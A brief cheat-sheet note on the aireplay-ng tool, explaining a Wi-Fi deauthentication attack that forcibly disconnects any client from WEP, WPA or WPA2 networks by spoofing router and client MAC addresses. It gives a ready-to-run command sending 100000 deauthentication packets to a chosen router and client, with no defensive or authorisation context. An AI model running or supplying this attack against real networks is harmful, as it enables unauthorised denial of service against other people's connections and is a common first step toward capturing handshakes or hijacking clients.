# aireplay-ng

- Disconnect any client from any network (`Deauthentication attack`)
- Works on encrypted networks WEP, WPA & WPA2
- No need to connect to the network
- What is done is:
  - You impersionate the MAC of the client with a "disconnect" signal and send to the router
  - You impersionate the MAC of the router with a "ok, disconnected" signal and send to the client

```shell
aireplay-ng "wlp3s0mon" \
  --deauth "100000" \ # number of packets to send (to the router and the client)
  -D \ # for 5GHz networks only (disable AP detection)
  -a "router-mac" \
  -c "client-mac"
```
